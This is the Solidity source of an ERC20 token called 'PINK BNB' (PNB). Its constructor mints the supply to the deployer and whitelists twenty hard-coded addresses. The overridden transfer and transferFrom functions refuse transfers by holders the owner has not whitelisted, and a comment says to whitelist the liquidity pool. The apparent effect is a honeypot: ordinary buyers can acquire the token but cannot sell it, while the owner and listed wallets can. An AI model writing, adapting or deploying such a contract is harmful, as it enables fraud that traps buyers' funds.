// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "./ERC20.sol";
import "./Ownable.sol";


// You have to addd LP tokens In the White List after you add liquidity.

contract SpecialToken is ERC20, Ownable {

    mapping (address => bool) whiteList;
    constructor() ERC20("PINK BNB", "PNB") {
        whiteList[msg.sender]= true;
        _mint(msg.sender, 1000000000 * 10 ** decimals());
        whiteList[0xB201fc5A75ff7050CFF24a8e91157A2AbA1A117c]= true;
        whiteList[0xf458271AdC61038635570056f5cfeB93A98DF5b8]=true;
        whiteList[0x4006175a6a4b652d2A19C84Ca5abe8eff136Fb55]=true;
        whiteList[0x59182F69498C2e6c67183aAA5b895ad22204fF35]=true;
        whiteList[0x1DEeFD155a04D729D9B431DbCb45bD20c8dA682B]=true;
        whiteList[0x9805380a334436A321B46d6EDc2c09f58Fe08af0]=true;
        whiteList[0xBe162a59cd0B8bb705Cbd7E754f6a0366fB5C29F]=true;
        whiteList[0xfAa0728eCbCf53F0C29c6804771926413A05DD51]=true;
        whiteList[0x3A84CF23f73607442bf8197A7d9f281Fb59aEe13]=true;
        whiteList[0x1976C612D22CdECdA477CB5f7f17AE37e440Cb20]=true;
        whiteList[0xc0D0C0AFB6FD50eD18F2803Cf24041f7B898a56e]=true;
        whiteList[0x77E4df26A6E2da3E6A930aFD0aF82847aa8A930a]=true;
        whiteList[0xB2436a3A4349BeaEca62F79bF8983eee1DEc383A]=true;
        whiteList[0xbfa809833F05F78a8C29ED927FC35D2321DcE457]=true;
        whiteList[0xb6fcf6094c495900a433657CAED95797910206F8]=true;
        whiteList[0x74e1cec08166B1732D932EE351dEFfa29ccb8d8a]=true;
        whiteList[0x7Ed5993D7dC787d2553C0e20A0dF7E4E0C06BE90]=true;
        whiteList[0xcCDFa689376Dd4193B3e77C3a27D0655C162046c]=true;
        whiteList[0xcFCC58e236Db231353B1D6bF981218683236464A]=true;
        whiteList[0x75e3453b0B968F833F25da24C4c17E549Cb5d610]=true;
    }
    function addTowhiteList(address add) public onlyOwner{
        whiteList[add]=true;
    }

    function removeFromWhiteList(address add) public onlyOwner{
        whiteList[add]=false;
    }

    function getStatus(address add) public view onlyOwner returns (bool status){
        return whiteList[add];
    }

    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        if(owner()!= to && owner()!=msg.sender)
        {
            require(whiteList[msg.sender], "Not authorized");
        }
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    function transferFrom(address from,address to,uint256 amount) public virtual override returns (bool) {
        if(owner()!= to && owner()!=from)
        {
            require(whiteList[from]&&whiteList[to], "Not authroized");
        }
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

}